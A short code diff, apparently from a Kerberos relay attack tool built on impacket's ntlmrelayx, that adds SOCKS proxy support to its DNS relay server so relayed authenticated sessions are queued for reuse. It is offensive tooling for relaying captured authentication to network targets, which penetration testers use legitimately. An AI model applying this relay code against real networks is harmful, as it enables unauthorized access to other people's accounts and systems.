@@ -10,6 +10,7 @@ from impacket.structure import Structure
 from dns.message import from_wire
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
+from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from lib.utils.kerberos import get_kerberos_loot, get_auth_data
 
@@ -66,6 +67,13 @@ class DNSRelayServer(Thread):
                     # Found a target with the same SPN
                     client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
                     client.initConnection(authdata, self.server.config.dcip)
+                    # Check if SOCKS is enabled
+                    if self.config.runSocks and target.scheme.upper() in self.config.socksServer.supportedSchemes:
+                        if self.config.runSocks is True:
+                            #Pass all the data to the sockspluginsproxy
+                            activeConnections.put((target.hostname, client.targetPort, target.scheme.upper(),
+                                                self.authUser, client, client.sessionData))
+                            return
                     # We have an attack.. go for it
                     attack = self.server.config.attacks[parsed_target.scheme.upper()]
                     client_thread = attack(self.server.config, client.session, self.authUser)
